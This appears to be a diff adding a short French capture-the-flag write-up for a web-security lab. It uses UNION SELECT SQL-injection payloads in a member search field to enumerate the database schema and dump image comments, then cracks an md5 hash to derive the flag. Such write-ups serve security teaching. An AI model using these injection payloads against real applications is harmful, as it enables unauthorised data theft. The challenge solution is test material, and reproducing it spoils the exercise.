@@ -1,0 +1,24 @@
+Grace a aux injections SQL possible via le search member nous pouvons recuperer un autre flag contenu dans le commentaire de l'images avec l'id 5
+
+1/ Recuperer les tables de la DB et trouver image :
+    1 UNION SELECT table_schema, table_name FROM information_schema.columns
+
+2/ la table "list_images" est contenu dans la DB Member_images
+
+3/ On cherche les colonnes de cette table :
+    1 UNION SELECT table_name, column_name FROM information_schema.columns
+
+4/ La table "list_images" possede id, title, url, comment
+
+5/ On s'interesse au titre et comment :
+    1 UNION SELECT title, comment FROM Member_images.list_images
+
+6/ On obtient ceci pour l'image "Hack me ?" :
+
+ID: 1 UNION SELECT title, comment FROM Member_images.list_images
+First name: Hack me ?
+Surname : If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
+
+7/ En essayant de trouver le mot correspondant au hash md5 1928e8083cf461a51303633093573c46 (toujours avec ce site https://hashes.com/en/decrypt/hash) on obtient le mot "albatroz"
+
+8/ En hashant le mot "albatroz" avec sha256sum on obtient le flag.
